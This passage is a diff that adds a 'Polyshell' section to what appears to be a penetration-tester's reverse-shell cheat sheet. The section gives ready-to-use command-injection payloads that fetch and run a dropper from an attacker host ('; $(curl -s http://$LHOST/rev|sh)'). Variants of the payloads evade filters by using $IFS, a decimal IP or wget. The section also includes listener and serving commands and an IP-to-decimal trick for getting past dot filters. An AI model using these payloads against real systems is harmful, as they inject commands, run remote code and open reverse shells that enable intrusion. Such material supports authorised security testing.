@@ -47,6 +47,43 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
+## Polyshell
+
+[polyshell](https://github.com/Chaelsoo/polyshell) generates a dropper script called `rev` that tries every available interpreter on the target in sequence (python3 → python2 → bash → perl → php → ruby → socat → nc variants), stopping on the first successful connection. The injected string stays minimal: no spaces, quotes, or redirect operators, so it survives more filter configurations than a raw shell payload.
+
+Stand up a listener, generate the dropper and serve it, then inject.
+
+```bash wrap
+# Terminal 1: listener
+nc -lvnp 4444
+
+# Terminal 2: generate and serve
+python3 revgen.py tun0 4444 --serve
+python3 -m http.server 80
+```
+
+Choose an inject pattern based on what the target filters.
+
+```bash wrap
+# Standard
+; $(curl -s http://$LHOST/rev|sh)
+
+# Space filtered
+;$(curl$IFS-s$IFS http://$LHOST/rev|sh)
+
+# Dotted IP filtered
+; $(curl -s http://$DECIMAL_IP/rev|sh)
+
+# No curl
+; $(wget -qO- http://$LHOST/rev|sh)
+```
+
+Convert your IP to its decimal equivalent when dots are filtered.
+
+```bash wrap
+python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('$LHOST'))[0])"
+```
+
 ## SUID Failures in Reverse Shells
 
 Some privesc paths look valid but silently do nothing through a reverse shell. Two mechanisms cause this.
